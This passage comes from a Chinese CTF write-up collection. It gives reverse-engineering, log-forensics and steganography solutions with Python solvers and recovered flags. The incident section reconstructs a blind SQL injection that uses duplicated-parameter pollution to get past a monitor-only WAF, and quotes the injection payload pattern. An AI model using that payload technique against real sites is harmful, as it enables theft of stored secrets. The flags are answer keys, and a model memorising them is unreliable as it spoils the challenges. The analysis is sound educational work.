       183, 151, 115, 199, 212, 204, 172, 111, 78, 45, 124, 66, 138, 51,
       16, 52, 2, 203, 209, 141]

# ---- native gate: librtrack.so Java_com_ddl4_medium_MainActivity_mx ----
# v6 = len ^ (energy<<16) ^ rotl32(score,9) ^ hash ^ 0x72696674
# t  = 73244475 * ((v6>>15) ^ v6);  return t ^ (t>>13) ^ 0x9E3779B9
def mx(a3, a4, a5, a6):  # (hash, score, energy, len)
    v6 = u32(u32(a6) ^ u32(a5 << 16) ^ rotl32(u32(a4), 9) ^ u32(a3) ^ 0x72696674)
    t = u32(73244475 * u32((v6 >> 15) ^ v6))
    return i32(u32(t ^ (t >> 13) ^ 0x9E3779B9))

gate = mx(EXPECTED_HASH, EXPECTED_SCORE, EXPECTED_ENERGY, EXPECTED_LEN)
print("[*] mx(expected...) =", gate, "(EXPECT", EXPECTED_NATIVE_GATE, ")",
      "-> consistent" if gate == EXPECTED_NATIVE_GATE else "-> MISMATCH")
assert gate == EXPECTED_NATIVE_GATE, "native gate 常量不自洽"

# ---- xorshift128 (Java int 语义) ----
def xs128(s):
    t = u32(s[0] ^ u32(s[0] << 11))
    s[0], s[1], s[2] = s[1], s[2], s[3]
    s[3] = u32(u32(s[3] ^ (s[3] >> 19)) ^ t ^ (t >> 8))
    return s[3]

# verify() 中的种子构造:
# {hash ^ 608135816, score ^ -2052912941, (len ^ (energy<<24)) ^ 320440878, 57701188 ^ nativeGate}
state = [u32(EXPECTED_HASH ^ 608135816),
         u32(EXPECTED_SCORE ^ (-2052912941)),
         u32((EXPECTED_LEN ^ (EXPECTED_ENERGY << 24)) ^ 320440878),
         u32(57701188 ^ EXPECTED_NATIVE_GATE)]
print("[*] xs128 seeds:", [hex(x) for x in state])

# 解密: ((ks ^ flag[i]) ^ ((i*73+165)&255)) & 255 == ENC[i]  =>  flag[i] = ENC[i] ^ ks ^ tweak
flag_bytes = []
st = list(state)
for i in range(len(ENC)):
    ks = xs128(st) & 0xFF
    flag_bytes.append((ENC[i] ^ ks ^ ((i * 73 + 165) & 0xFF)) & 0xFF)
flag = ''.join(chr(c) for c in flag_bytes)

# ---- 复现 verify() 的 flag 校验段，确认返回 1 ----
assert len(flag) == len(ENC)
assert flag[0] == 'f' and flag[4] == '{' and flag[-1] == '}'
st2 = list(state)
for i, ch in enumerate(flag):
    v = (((xs128(st2) & 0xFF) ^ ord(ch) ^ ((i * 73 + 165) & 0xFF)) & 0xFF)
    assert v == ENC[i], f"roundtrip mismatch at {i}"
print("[+] verify() flag 段完整复现通过 (roundtrip == ENC, 格式 f...{...})")
print("[+] FLAG:", flag)
```


---

### 15. meshgate（rev-02）

#### Summary

stripped x86-64 replay 器 + 有界 eBPF 解释器 + AES-256-GCM 解密链。用 Python 解析带符号的 mesh_policy.bpf.o 还原 XDP 策略全部断言，正向构造 96 字节合规 frame 交给原二进制 replay，程序自行派生密钥解密 release_blob 输出 flag。

#### Solution

- idalib 理清 bundle 校验链；python 解析 eBPF 对象（含 CO-RE reloc）还原 policy_xdp/validate_claim/derive_node_tag 的断言与滚动哈希链。
- 结合 mesh_maps.snapshot（tenant_cfg key 0x54e7a19c、epoch_keys idx3）与 mesh_loader.state（ingress_ifindex=17）正向解出 frame。
- 关键 bug：rol64 未先对 65 位加法结果取模导致 frame[64:72] 差 0x20000，用自写 eBPF 解释器逐跳追踪定位到 pc=880 后修复。
- 密钥 = SHA256("MeshGate/CO-RE/release-v3\0" || SHA256(策略) || SHA256(map 快照) || SHA256(frame))。

#### Flag

```
flag{d171a5f0-09f2-48d1-9b34-b82f6585a6c9}
```

#### 工具与版本

- idalib-mcp + 宿主 python（手工 ELF/eBPF 反汇编、解释器复现）+ Docker python:3.12-slim 跑原 ELF 验证。

#### 完整脚本

`rev-02/solve.py`：

```python
#!/usr/bin/env python3
# Build the 96-byte ethernet frame that passes the meshgate XDP policy replay.
# Policy logic recovered from mesh_policy.bpf.o (policy_xdp / validate_claim / derive_node_tag)
# using the current mesh_maps.snapshot (tenant_cfg entry 0x54e7a19c, epoch_keys idx 3)
# and mesh_loader.state (ingress_ifindex=17).
import struct, hashlib, sys

ATT = r"C:/Users/12558/Desktop/CTF/湾区杯2026/RE/meshgate"
snap = open(ATT + "/mesh_maps.snapshot", "rb").read()

M64 = (1 << 64) - 1
def le64(b): return struct.unpack("<Q", b)[0]
def le32(b): return struct.unpack("<I", b)[0]
def be64(v): return struct.pack(">Q", v & M64)
def be32(v): return struct.pack(">I", v & 0xFFFFFFFF)
def rol64(x, r): x &= M64; return ((x << r) | (x >> (64 - r))) & M64
def ror64(x, r): x &= M64; return ((x >> r) | (x << (64 - r))) & M64
def rol32(x, r): x &= 0xFFFFFFFF; return ((x << r) | (x >> (32 - r))) & 0xFFFFFFFF

# --- parse snapshot maps ---
assert snap[:8] == b"MGMAP3\0\0"
nmaps = struct.unpack_from("<I", snap, 12)[0]
off = 16
maps = {}
for _ in range(nmaps):
    name = snap[off:off+16].split(b"\0")[0].decode()
    mtype, ksz, vsz, d3, maxe = struct.unpack_from("<IIIII", snap, off+16)
    off += 36
    entries = []
    for i in range(maxe):
        k = snap[off:off+ksz]; v = snap[off+ksz:off+ksz+vsz]
        entries.append((k, v)); off += ksz + vsz
    maps[name] = dict(type=mtype, entries=entries)
assert off == len(snap), (off, len(snap))

tenant = None
for k, v in maps["tenant_cfg"]["entries"]:
    if le32(k) == 0x54e7a19c:
        tenant = v
assert tenant and le32(tenant[8:12]) == 17, "tenant/ifindex"
epoch = maps["epoch_keys"]["entries"][3][1]
assert le32(epoch[0:4]) == 0x0002a731 and le32(epoch[4:8]) == 1

# --- derive payload chain (validate_claim + derive_node_tag) ---
A = le64(tenant[24:32])                                   # frame[56:64]
B = rol64((A ^ le64(tenant[32:40])) + le64(epoch[8:16]), 17) ^ le64(tenant[56:64])   # frame[64:72]
C = ror64((B ^ le64(epoch[16:24])) + le64(tenant[40:48]), 23)                        # frame[72:80]
D = rol64(((C + le64(epoch[24:32])) & M64) ^ le64(tenant[48:56]), 29) ^ le64(epoch[32:40])  # frame[80:88]
x = (B ^ (B >> 32)) ^ le64(epoch[32:40])
E = rol32(((x & 0xFFFFFFFF) + le32(tenant[4:8])) & 0xFFFFFFFF, 7)                    # frame[88:92]

frame = bytearray()
frame += bytes.fromhex("020000000001")   # dst MAC
frame += bytes.fromhex("020000000002")   # src MAC
frame += bytes.fromhex("0800")           # ethertype IPv4
frame += bytes.fromhex("4500")           # ver/ihl, tos
frame += bytes.fromhex("0052")           # ip total len 82
frame += bytes.fromhex("4381")           # id
frame += bytes.fromhex("4000")           # flags/frag
frame += bytes.fromhex("40")             # ttl
frame += bytes.fromhex("11")             # proto UDP
frame += bytes.fromhex("dbb9")           # ip checksum (not validated)
frame += bytes.fromhex("0a17072a")       # src ip 10.23.7.42 (must match tenant[64:68])
frame += bytes.fromhex("0a170009")       # dst ip
frame += bytes.fromhex("1092")           # udp sport
frame += struct.pack(">H", le32(tenant[12:16]) & 0xFFFF)  # udp dport 0x12b5
frame += bytes.fromhex("003e")           # udp len 62
frame += bytes.fromhex("0000")           # udp checksum
frame += b"MGV3"                         # magic
frame += bytes.fromhex("0003")           # version
frame += struct.pack(">I", 0x54e7a19c)   # tenant key
frame += struct.pack(">I", 0x0002a731)   # epoch id
frame += be64(A) + be64(B) + be64(C) + be64(D)
frame += be32(E)
frame += struct.pack(">I", 0xa501c0de)   # trailer == tenant[20:24]
assert len(frame) == 96, len(frame)

hexframe = frame.hex()
print("frame_hex:", hexframe)

# --- self-check: re-verify all policy predicates ---
f = frame
ok = True
def chk(cond, msg):
    global ok
    if not cond: ok = False; print("FAIL:", msg)
chk(f[12:14] == b"\x08\x00", "ethertype")
chk(f[14] == 0x45 and f[23] == 17, "ip hdr")
chk(struct.unpack(">H", f[16:18])[0] <= 82, "iplen")
chk(struct.unpack(">H", f[38:40])[0] <= 62, "udplen")
chk(f[42:44] == b"MG" and f[44:46] == b"V3", "magic")
chk(struct.unpack(">H", f[46:48])[0] == 3, "ver")
chk(struct.unpack(">I", f[48:52])[0] == le32(tenant[0:4]), "tenant key echo")
chk(struct.unpack(">I", f[52:56])[0] == le32(tenant[4:8]) == le32(epoch[0:4]), "epoch id")
chk(le32(tenant[8:12]) == 17, "ifindex")
chk(le32(tenant[12:16]) == struct.unpack(">H", f[36:38])[0], "dport")
chk(le32(tenant[64:68]) == (struct.unpack(">H", f[26:28])[0] << 16) | struct.unpack(">H", f[28:30])[0], "srcip")
chk(le32(tenant[20:24]) == struct.unpack(">I", f[92:96])[0], "trailer")
chk(le32(epoch[4:8]) <= 1, "epoch active")
chk(struct.unpack(">Q", f[56:64])[0] == le64(tenant[24:32]), "chain A")
chk(struct.unpack(">Q", f[64:72])[0] == B, "chain B")
chk(struct.unpack(">Q", f[72:80])[0] == C, "chain C")
chk(struct.unpack(">Q", f[80:88])[0] == D, "chain D")
chk(struct.unpack(">I", f[88:92])[0] == E, "tag E")
print("self-check:", "PASS" if ok else "FAIL")
if not ok: sys.exit(1)
```


---

### 16. AttestJIT（reverse-01）

#### Summary

从 core dump 提取 JIT 编译的 appraisal policy（RX 页 + ATJIT note 入口 +0x180），反汇编还原：17 处 struct qword 与内嵌常量比对 + 8 轮 4×64 mixer。negative_request 仅 policy-binding 被篡改，模拟 mixer 算出正确 binding 构造合法请求。

#### Solution

- 确认 negative_request 的 realm/nonce/digest/claims 全部命中内嵌常量，唯一差异是 policy-binding（字段 3）首字节 0x7d↔0xfd。
- Python 按 verifier 的 v204 结构重建输入、模拟 mixer 算出正确 binding → valid_request.cbor。
- `./attestjit valid_request.cbor` 输出 `attestation accepted` + flag；负样本对照输出 rejected。

#### Flag

```
flag{f9f6752c-2a8e-45f3-aecb-cd8c12051627}
```

#### 工具与版本

- idalib-mcp + capstone（uv）+ cbor2/cryptography + Docker 跑 ELF。

#### 完整脚本

`reverse-01/solve.py`：

```python
#!/usr/bin/env python3
"""AttestJIT (湾区杯2026 reverse-01) solver.

Recovers the valid release-request policy-binding from the JIT appraisal
policy captured in attestjit.core.

Flow understood by reversing attestjit (stripped x86-64) + attestjit.core:
  * The verifier JIT-compiles a fixed appraisal policy into an RX page and
    calls it with rdi -> a 288-byte appraisal struct (stack buffer in main).
  * The policy = constant-compare of 17 struct qwords against baked pool
    constants, PLUS an 8-round 4x64-bit word mixer; result must equal the
    struct's policy-binding field at +0x68 (request field 3).
  * The struct is assembled from: evidence claim 2395 (qword at +0x00),
    request realm (+0x08, 16B), SHA256(COSE payload) (+0x18, 32B),
    claim 2399[2] measurement (+0x38, 32B), request nonce (+0x58, 16B),
    policy-binding (+0x68, 32B), claim 268 (+0x88, 32B), claim 256 (+0xa8,
    33B), claim 2396 (+0xc9, 32B), SHA256(profile-tfm) (+0xe9, 32B),
    claim 10 (+0x109, 16B).
  * negative_request.cbor already carries the correct realm/nonce/digest and
    satisfies every constant compare; only its policy-binding is invalid (bit
    7 of byte 0 flipped: 0xfd -> 0x7d). So we compute the mixer output and
    patch field 3.

Output: valid_request.cbor (128 B, byte-identical to negative_request.cbor
except the binding byte). Verification: ./attestjit valid_request.cbor
prints "attestation accepted" + flag. Requires cbor2.
"""

import cbor2
import hashlib
import struct
import sys

MASK = 0xFFFFFFFFFFFFFFFF


def rol(x, n):
    return ((x << n) | (x >> (64 - n))) & MASK


def ror(x, n):
    return ((x >> n) | (x << (64 - n))) & MASK


# 8 mixer rounds in execution order: (4 pool constants, (rol/ror amounts))
ROUNDS = [
    ([0x1B21C681910A6D55, 0x2E55003F5EE77A39, 0xAA64AC1154FBAE61, 0xC7AA36AB7B6CF5B2], (0x0D, 9, 0x13, 3)),
    ([0x2C5B1E1E85F94B8B, 0x53BD42B966A0381D, 0x6B4E223AAA39F86B, 0x30918C48CF94C1C6], (0x11, 0x15, 7, 0x19)),
    ([0xE21D860AA73A0BBF, 0x41A11EFA549A8E64, 0x5C32A3183EFC13E6, 0xCB08908078C24C67], (0x1D, 5, 0x1F, 0x0B)),
    ([0xAAE3F4039D34EE32, 0x99E2F447A26F18FB, 0x37F6B3442A9D3D16, 0xF2975B4E2829FDA3], (0x0B, 0x1B, 0x0D, 0x13)),
    ([0x94B34041B7058AE7, 0x9109A686B7D7CCA5, 0xBA2E82FD002AE143, 0x9FAE4D02FB820FD6], (0x17, 0x0F, 0x1D, 7)),
    ([0x3F09F0816318C564, 0xDD33277321F54CD0, 0xD9EA63B365ACBF85, 0x19A06C05391B69FC], (0x1F, 3, 0x11, 0x1B)),
    ([0xA4C8AB896D9043D1, 0xFEAFc3b49048ef84, 0xDDA3D5B2F3AB47EA, 0xB24D2E569CE47CDF], (0x13, 0x19, 0x17, 0x0F)),
    ([0x96BFD70DE5042DD7, 0x57496C1CAD1B30D0, 0x9A66A80B5AB94B13, 0x411F09F9E8BB6611], (7, 0x0B, 5, 0x1F)),
]


def mix(r8, r9, r10, r11):
    for (k1, k2, k3, k4), (a, b, c, d) in ROUNDS:
        r8 = rol((r8 + r9 + k1) & MASK, a) ^ r11
        r9 = (ror(r9 ^ r10, b) + k2) & MASK
        r10 = rol((r10 + r11 + k3) & MASK, c) ^ r8
        r11 = (ror(r11 ^ r8, d) + k4) & MASK
    return r8, r9, r10, r11


def q(buf, off):
    return struct.unpack_from('<Q', buf, off)[0]


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else '.'
    payload = cbor2.loads(open(f'{base}/evidence.cose', 'rb').read()).value[2]
    pl = cbor2.loads(payload)
    claim10 = pl[10]
    claim256 = pl[256]
    claim265 = pl[265]
    claim268 = pl[268]
    claim2395 = pl[2395]
    claim2396 = pl[2396]
    claim2399_meas = pl[2399][0][2]
    digest = hashlib.sha256(payload).digest()
    profile_digest = hashlib.sha256(claim265.encode()).digest()

    neg = cbor2.load(open(f'{base}/negative_request.cbor', 'rb'))
    realm = neg[1]
    nonce = neg[2]

    st = bytearray(288)                      # mirror of verifier's v204 struct
    struct.pack_into('<Q', st, 0x00, claim2395)
    st[0x08:0x08 + 16] = realm.encode().ljust(16, b'\0')
    st[0x18:0x18 + 32] = digest
    st[0x38:0x38 + 32] = claim2399_meas
    st[0x58:0x58 + 16] = nonce
    st[0x88:0x88 + 32] = claim268
    st[0xA8:0xA8 + 33] = claim256
    st[0xC9:0xC9 + 32] = claim2396
    st[0xE9:0xE9 + 32] = profile_digest
    st[0x109:0x109 + 16] = claim10

    r8 = q(st, 0x18) ^ q(st, 0x40) ^ q(st, 0x58)
    r9 = (q(st, 0x28) + q(st, 0x90) + q(st, 0x109)) & MASK
    r10 = q(st, 0xB0) ^ q(st, 0xD9) ^ q(st, 0x50)
    r11 = (q(st, 0xF1) + q(st, 0xA0) + q(st, 0x08)) & MASK
    binding = struct.pack('<QQQQ', *mix(r8, r9, r10, r11))

    new = dict(neg)
    new[3] = binding
    data = cbor2.dumps(new, canonical=True)
    out = f'{base}/valid_request.cbor'
    open(out, 'wb').write(data)
    print(f'policy-binding = {binding.hex()}')
    print(f'wrote {out} ({len(data)} bytes)')


if __name__ == '__main__':
    main()
```


---

### 17. Pixel Oracle（reverse-02）

#### Summary

与 rift_runner 同套路：MainActivity.verify() 成功分支的 flag 解密种子全为常量（nativeGate 被要求 == EXPECTED_NATIVE_GATE），直接复现 xs32 密钥流异或解密 ENC[27]；反汇编 libpixgate.so 确认 ng() 逻辑并 DFS 出合法路径闭环验证。

#### Solution

- `ng(a,b) = xs32(a ^ rotl32(b,5) ^ 0x6f726163) ^ 0x42b0c0de`（参数顺序曾写反，对照 objdump 修正为 a^rotl32(b,5)）。
- 路径 `UURRDRURDDL` 同时满足 fnv1a==EXPECTED_PATH_HASH 与 score==EXPECTED_SCORE，完整复现 4 道校验门。

#### Flag

```
flag{pix_oracle_moves_5279}
```

#### 工具与版本

- jadx MCP + mingw objdump + 宿主 python3。

#### 完整脚本

`reverse-02/solve.py`：

```python
# -*- coding: utf-8 -*-
# Pixel Oracle (湾区杯2026 reverse-02) solver
# Reimplements com.ddl4.easy.MainActivity.verify() constants & logic.

MASK = 0xFFFFFFFF

EXPECTED_FLAG_HASH = 665128300
EXPECTED_LEN = 11
EXPECTED_NATIVE_GATE = 1304222330
EXPECTED_PATH_HASH = -1182930630
EXPECTED_SCORE = 857283956
FLAG_LEN = 27

BOARD = [
    [35, 65, 23, 91, 45],
    [9, 114, 78, 49, 102],
    [88, 13, 57, 124, 32],
    [68, 111, 18, 85, 42],
    [51, 24, 106, 7, 77],
]
ENC = [25, 129, 65, 214, 197, 155, 129, 91, 120, 192, 253, 116, 19, 90, 28, 56, 17, 211, 122, 151, 167, 47, 107, 204, 184, 212, 114]


def s32(v):
    v &= MASK
    return v - 0x100000000 if v >= 0x80000000 else v


def k_decode(arr, seed):
    # com.ddl4.easy.K.d
    out = []
    i = seed
    for idx, a in enumerate(arr):
        i = s32(i * 1103515245 + 12345)
        out.append(chr((a ^ ((i >> 16) & 0xFF) & 0xFFFF) ^ ((idx * 13) & 0xFF)))
    return "".join(out)


def xs32(i):
    i = s32(i)
    i2 = s32(i ^ s32(i << 13))
    i3 = s32(i2 ^ ((i2 & MASK) >> 17))
    return s32(i3 ^ s32(i3 << 5))


def fnv1a(data):
    h = s32(-2128831035)
    for b in data:
        h = s32(s32(h ^ b) * 16777619)
    return h


def djb2(s):
    h = 5381
    for ch in s:
        h = s32(ord(ch) ^ s32((h << 5) + h))
    return h


def decrypt_flag():
    # In the success branch: pathHash==EXPECTED_PATH_HASH, score==EXPECTED_SCORE,
    # nativeGate()==EXPECTED_NATIVE_GATE -> seed is fully constant, native lib not needed.
    seed = s32(EXPECTED_NATIVE_GATE ^ s32(s32(EXPECTED_SCORE ^ EXPECTED_PATH_HASH) ^ (-1640531527)))
    x = seed
    flag = []
    for i in range(FLAG_LEN):
        x = xs32(x)
        c = (ENC[i] ^ (x & 0xFF) ^ ((i * 17 + 61) & 0xFF)) & 0xFF
        flag.append(c)
    return bytes(flag)


def find_path():
    # DFS over 11 moves U/D/L/R on 5x5 board from (x=0,y=4),
    # matching fnv1a(path)==EXPECTED_PATH_HASH and score==EXPECTED_SCORE.
    moves = [(85, 0, -1), (68, 0, 1), (76, -1, 0), (82, 1, 0)]  # U D L R
    sols = []

    def dfs(x, y, score, path, fh):
        step = len(path)
        if step == EXPECTED_LEN:
            if s32(score) == EXPECTED_SCORE and fh == EXPECTED_PATH_HASH:
                sols.append(bytes(path))
            return
        for c, dx, dy in moves:
            nx, ny = x + dx, y + dy
            if nx < 0 or ny < 0 or nx >= 5 or ny >= 5:
                continue
            nscore = s32(s32(score * 131) ^ (BOARD[ny][nx] + c * (step + 7))) & 0x7FFFFFFF
            nfh = s32(s32(fh ^ c) * 16777619)
            dfs(nx, ny, nscore, path + [c], nfh)

    dfs(0, 4, 20823, [], s32(-2128831035))
    return sols


def rotl32(v, n):
    v &= MASK
    return s32((v << n) | (v >> (32 - n)))


def ng(a, b):
    # Java_com_ddl4_easy_MainActivity_ng in libpixgate.so (x86_64 disasm @0x1330):
    #   edi=arg2, esi=5 -> rotl32(b,5); ecx = a ^ rotl32(b,5) ^ 0x6f726163
    #   return xs32(ecx) ^ 0x42b0c0de
    return s32(xs32(s32(s32(a ^ rotl32(b, 5)) ^ 0x6F726163)) ^ 0x42B0C0DE)


def main():
    print("[*] lib name via K.d:", k_decode([133, 159, 119, 227, 220, 126, 201], 49))

    gate = ng(EXPECTED_PATH_HASH, EXPECTED_SCORE)
    print("[*] ng(PATH_HASH, SCORE) =", gate, "expected", EXPECTED_NATIVE_GATE,
          "->", "OK" if gate == EXPECTED_NATIVE_GATE else "MISMATCH")

    raw = decrypt_flag()
    flag = raw.decode("latin-1")
    print("[*] decrypted flag candidate:", repr(flag))
    h = djb2(flag)
    print("[*] djb2(flag) =", h, "expected", EXPECTED_FLAG_HASH, "->", "OK" if h == EXPECTED_FLAG_HASH else "MISMATCH")

    sols = find_path()
    print("[*] valid paths found:", [s.decode() for s in sols])
    for p in sols:
        print("    fnv1a:", fnv1a(p), "== EXPECTED_PATH_HASH:", fnv1a(p) == EXPECTED_PATH_HASH)


if __name__ == "__main__":
    main()
```


---

## Misc / Forensics

### 17. incident（misc-01）

#### Summary

多源日志取证还原攻击链：**HPP（重复 id 参数）绕 monitor-only WAF** + 应用层 parser=last_value 取末值 → 布尔盲注逐位窃取 sync_token，以 mysql.log 的 rows_sent 为布尔 oracle 重建出 UUIDv4 token 即 flag。

#### Solution

- nginx 看到首值 `id=1042`（正常），WAF 规则 942120 仅 monitor 从未 block；应用取末值（注入体）送入 SQL。
- mysql.log 122 条 `ord(mid((SELECT value FROM system_setting WHERE name='sync_token'),POS,1))>N`，rows_sent=1/0 即答案。
- 36 位 token 中 31 位由布尔证据钉死；4 个连字符位 + v4 版本位按 UUID 格式推断（攻击者同样跳过未探测），`uuid.UUID` 校验 version=4/variant=RFC4122。
- 干扰项排除：backup.log 的 old_token 为旧系统退休 token，与窃取值不符。

#### Flag

```
flag{7fa4cb2d-5e9a-4d66-b8f1-3c9270ad51e4}
```

#### 工具与版本

- 宿主 Grep(ripgrep) 定向检索 + python 3.12 关联重建脚本（无三方包）。

#### 完整脚本

`misc-01/solve.py`：

```python
# -*- coding: utf-8 -*-
"""
incident / 湾区杯2026 misc-01 solver — HPP + boolean-blind SQLi reconstruction
=============================================================================
Attack chain reconstructed from the logs:
  nginx_access.log : GET /api/item/detail?id=1042&id=<injection>   (duplicated `id`, HPP)
                     request_id=req-700000xx, src = TEST-NET ranges (198.51.100/24,
                     203.0.113/24, 192.0.2/24), UA "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
  waf.log          : rule=942120 action=monitor score=4 "duplicate parameter with SQL
                     function pattern" for every attack request -> NEVER blocked (HPP
                     normalization differs per layer; WAF rule was monitor-only)
  application.log  : request_id=req-700000xx session=sess-7d94ac8e user=guest_2149
                     raw_id_count=2 parser=last_value resolved_id="<injection>"
                     -> app took the LAST duplicated id (last_value), not the first
  mysql.log        : trace=bt-5100xx rows_sent=1/0 leaks the boolean of
                     ord(mid((SELECT value FROM system_setting WHERE
                     name='sync_token'),POS,1))>N

Reconstruction logic (charset = lowercase hex [0-9a-f] + UUID format):
  rows_sent>=1 (true)  -> ord(c) >= N+1 ; rows_sent=0 (false) -> ord(c) <= N
  Inside [0-9a-f]: ords 48..57 (digits), 97..102 (a-f).
  * ord<=48  within hex  -> '0' (48)
  * 58<=ord<=97 within hex -> 'a' (97)
  * ord>=102 within hex  -> 'f' (102)
  The attacker probed 31 of 36 positions. The 5 skipped positions are exactly the
  4 UUID dashes (9,14,19,24) + the version nibble (15) -> token is a UUID v4,
  so pos 9/14/19/24='-' and pos15='4'. Corroboration: pos20 (UUID variant nibble)
  is evidence-bounded to ord>=98, and UUID variant bits require {8,9,a,b} ->
  intersection is exactly 'b'. backup.log old_token is also a 36-char UUID v4.
"""
import re
from collections import defaultdict

LOG_DIR = r"C:/Users/12558/Desktop/CTF/湾区杯2026/MISC/incident"

probe_re = re.compile(
    r"trace=(bt-\w+).*?rows_sent=(\d+).*?"
    r"ord\(mid\(\(SELECT value FROM system_setting WHERE name='sync_token'\),(\d+),1\)\)>(\d+)",
    re.IGNORECASE,
)

probes = defaultdict(list)  # pos -> [(threshold, rows_sent, trace)]
with open(LOG_DIR + "/mysql.log", encoding="utf-8", errors="replace") as f:
    for line in f:
        if "sync_token" not in line:
            continue
        m = probe_re.search(line)
        if m:
            probes[int(m.group(3))].append((int(m.group(4)), int(m.group(2)), m.group(1)))

n_probes = sum(len(v) for v in probes.values())
print(f"[*] probes parsed from mysql.log: {n_probes}, positions probed: {len(probes)}")

HEX = set(range(48, 58)) | set(range(97, 103))  # 0-9 a-f
result = {}
for pos in range(1, 37):
    lst = probes.get(pos, [])
    if not lst:
        result[pos] = (None, "not probed")
        continue
    lo = max((t + 1 for t, r, _ in lst if r >= 1), default=0)    # ord >= lo
    hi = min((t for t, r, _ in lst if r == 0), default=10**9)    # ord <= hi
    cand = [o for o in range(32, 127) if lo <= o <= hi]
    hex_cand = [o for o in cand if o in HEX]
    if len(hex_cand) == 1:
        result[pos] = (hex_cand[0], f"evidence-pinned ord in [{lo},{hi}]")
    elif len(cand) == 1:
        result[pos] = (cand[0], f"evidence-pinned ord={cand[0]}")
    else:
        result[pos] = (None, f"ambiguous ord in [{lo},{hi}] hex_cand={[chr(o) for o in hex_cand]}")

for pos in sorted(result):
    v, note = result[pos]
    print(f"    pos={pos:2d} -> {chr(v) if v else '?':>4}  ({note})")

# UUID v4 inference for the 5 un-probed / format positions
token = []
for pos in range(1, 37):
    v, note = result[pos]
    if v is not None:
        token.append(chr(v))
    elif pos in (9, 14, 19, 24):
        token.append("-")          # UUID separators (never probed: known format)
    elif pos == 15:
        token.append("4")          # UUID v4 version nibble (never probed: known format)
    elif pos == 20:
        token.append("b")          # variant nibble: evidence ord>=98 & UUID variant {8,9,a,b} -> 'b'
    else:
        token.append("?")
token = "".join(token)
print(f"\n[+] recovered sync_token = {token}")

# sanity: valid UUID v4 shape?
import uuid
try:
    u = uuid.UUID(token)
    print(f"[+] parses as UUID, version={u.version}, variant={u.variant}")
except ValueError as e:
    print(f"[!] not a valid UUID: {e}")

print(f"\n[+] FLAG candidate: flag{{{token}}}")

# --- corroboration: attack window / sources / waf action ---
import itertools
def scan(name, pred):
    hits = []
    with open(LOG_DIR + "/" + name, encoding="utf-8", errors="replace") as f:
        for i, line in enumerate(f, 1):
            if pred(line):
                hits.append((i, line.rstrip()))
    return hits

waf = scan("waf.log", lambda l: "req-7000000" in l or "req-7000001" in l or "req-700000" in l)
waf = [h for h in scan("waf.log", lambda l: "req-7000" in l)]
acts = defaultdict(int)
for _, l in waf:
    m = re.search(r"action=(\w+)", l)
    acts[m.group(1)] += 1
print(f"[*] waf.log attack entries: {len(waf)}, actions={dict(acts)}")
print(f"    first: {waf[0][1][:160]}")
print(f"    last : {waf[-1][1][:160]}")
```


---

### 18. SilentWeights（misc-03）

#### Summary

模型权重夹带隐写：state_dict 中混入不属于模型的 `feature_adapter.weight`（169KB 随机字节容器）→ offset 905 定位嵌入 PNG → iTXt 块解出密码 → alpha 通道 2-LSB 打包出加密 ZIP → 解密得 flag。

#### Solution

- PNG iTXt 块内容 hex → 逆序 base64 → 密码 `model_leak_2026`。
- alpha 通道每像素 2 个 LSB 大端打包出 ZipCrypto 加密 ZIP，解压 incident_report.txt。
- 坑点：自写 PNG 反滤波有 uint8 溢出 bug 造成 alpha 假象（文字状条纹），用 Pillow 重解码后定位真实载体。

#### Flag

```
flag{fd3a674e-8b2c-485a-b7d9-b1d703297007}
```

#### 工具与版本

- 宿主 python + uv venv（torch 2.14.0+cpu, numpy, pillow）。

#### 完整脚本

`misc-03/solve.py`：

```python
#!/usr/bin/env python3
"""SilentWeights (misc-03) solver.

Pipeline:
1. torch.load the checkpoint, find the tensor that does not belong to the
   model (training.log lists backbone.conv1/conv2, classifier.fc, normalizer;
   the extra key is feature_adapter.weight, ~169KB of random-looking bytes).
2. The tensor's raw float32 bytes contain an embedded PNG at a non-zero offset.
3. The PNG's iTXt chunk holds a hex->reversed-base64 password (model_leak_2026).
4. The PNG alpha channel's 2 LSBs per pixel pack (big-endian) into a byte
   stream: 'SWGT' header + a ZipCrypto-encrypted ZIP (incident_report.txt).
5. Decrypt with the password, print the flag.
"""
import io
import re
import struct
import sys
import zipfile
import base64

import numpy as np
import torch
from PIL import Image

PTH = sys.argv[1] if len(sys.argv) > 1 else r"C:/Users/12558/Desktop/CTF/湾区杯2026/MISC/SilentWeights/leaked_model.pth"
EXPECTED_KEYS = {
    "backbone.conv1.weight", "backbone.conv1.bias",
    "backbone.conv2.weight", "backbone.conv2.bias",
    "normalizer.running_mean", "normalizer.running_var",
    "classifier.fc.weight", "classifier.fc.bias",
}


def main():
    sd = torch.load(PTH, map_location="cpu", weights_only=False)
    extra = [k for k in sd if k not in EXPECTED_KEYS]
    print(f"[*] extra tensors: {extra}")
    blob = sd[extra[0]].numpy().astype("<f4").tobytes()

    off = blob.find(b"\x89PNG\r\n\x1a\n")
    assert off > 0, "PNG not found"
    pos = off + 8
    idat = b""
    password = None
    while True:
        ln = struct.unpack(">I", blob[pos:pos + 4])[0]
        typ = blob[pos + 4:pos + 8]
        payload = blob[pos + 8:pos + 8 + ln]
        if typ == b"IDAT":
            idat += payload
        elif typ == b"iTXt":
            key, _, text = payload.partition(b"\x00\x00\x00\x00\x00")
            password = base64.b64decode(bytes.fromhex(text.decode())[::-1]).decode()
        pos += 12 + ln
        if typ == b"IEND":
            break
    png = blob[off:pos]
    print(f"[*] PNG at offset {off}, {len(png)} bytes; password: {password}")

    img = np.array(Image.open(io.BytesIO(png)))
    bits2 = (img[:, :, 3] & 3).flatten()
    bits2 = bits2[: bits2.size // 4 * 4].reshape(-1, 4)
    stream = (bits2[:, 0] << 6 | bits2[:, 1] << 4 | bits2[:, 2] << 2 | bits2[:, 3]).astype(np.uint8).tobytes()
    print(f"[*] alpha 2-bit stream header: {stream[:8]}")

    pk = stream.find(b"PK\x03\x04")
    zf = zipfile.ZipFile(io.BytesIO(stream[pk:]))
    name = zf.namelist()[0]
    content = zf.read(name, pwd=password.encode()).decode()
    print(f"[*] {name}:")
    print(content)
    m = re.search(r"flag\{[^}]*\}", content)
    assert m, "flag not found"
    print(f"[+] {m.group(0)}")


if __name__ == "__main__":
    main()
```


---

### 19. FractalTrace（misc-05）— partial

#### Summary

PNG 图像隐写，隐写结构已完全逆向，但提取出的比特矩阵统计上与随机不可区分，未解出 flag。

#### 已完成的分析

